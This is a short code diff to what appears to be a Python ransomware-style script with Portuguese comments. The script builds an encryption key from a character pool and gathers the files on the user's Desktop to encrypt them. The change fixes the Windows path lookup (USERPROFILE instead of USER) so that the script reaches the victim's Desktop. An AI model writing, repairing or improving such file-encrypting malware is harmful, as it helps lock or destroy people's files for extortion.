@@ -42,7 +42,7 @@ key_char_pool_len = len(key_char_pool)
 
 #Pega filepaths para encriptar
 print("preparando arquivos...")
-desktop_path = os.environ['USER']+'\\Desktop'
+desktop_path = os.environ['USERPROFILE']+'\\Desktop'
 files = os.listdir(desktop_path)
 abs_files = []
 for f in files:
